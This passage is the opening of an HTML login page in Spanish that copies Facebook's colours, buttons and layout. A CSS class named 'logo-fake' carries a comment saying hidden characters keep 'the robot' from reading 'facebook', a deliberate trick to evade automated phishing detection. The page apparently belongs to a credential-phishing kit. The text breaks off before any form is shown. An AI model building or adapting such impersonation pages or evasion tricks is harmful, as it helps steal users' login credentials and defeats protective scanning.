<!DOCTYPE html>
<html lang="es">
<head>

    <title>Inicia sesi&oacute;n</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { display: flex; width: 90%; max-width: 980px; justify-content: space-between; align-items: center; flex-wrap: wrap; }
        
        /* Ofuscaci√≥n visual del logo */
        .logo-fake { 
            color: #1877f2; 
            font-size: 60px; 
            font-weight: bold; 
            letter-spacing: -3px; 
            font-family: sans-serif;
            margin-bottom: 5px;
        }
        /* Insertamos caracteres invisibles para que el robot no lea "facebook" */
        .logo-fake span { display: none; }

        .left-content { width: 500px; margin-bottom: 20px; }

        .btn-blue { background-color: #1877f2; color: white; font-size: 20px; font-weight: bold; padding: 10px; border: none; border-radius: 6px; width: 100%; cursor: pointer; }
        
        .f-link { display: block; margin: 15px 0; color: #1877f2; text-decoration: none; font-size: 14px; }
        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
        .btn-green { background-color: #42b72a; color: white; font-size: 17px; font-weight: bold; padding: 12px 16px; border: none; border-radius: 6px; cursor: pointer; text-decoration: none; display: inline-block; }
        
        @media (max-width: 800px) { .container { justify-content: center; text-align: center; } .left-content h2 { display: none; } }
    </style>
</head>
<body>

    <div class="container">
